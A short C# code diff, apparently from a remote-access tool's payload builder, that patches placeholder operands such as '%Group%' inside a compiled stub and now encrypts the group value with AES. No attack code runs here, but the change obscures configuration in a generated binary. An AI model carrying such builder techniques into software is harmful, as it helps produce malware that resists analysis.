@@ -450,7 +450,7 @@ namespace Server.Forms
                                         method.Body.Instructions[i].Operand = numDelay.Value.ToString();
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
-                                        method.Body.Instructions[i].Operand = txtGroup.Text;
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
                                 }
                             }
                         }
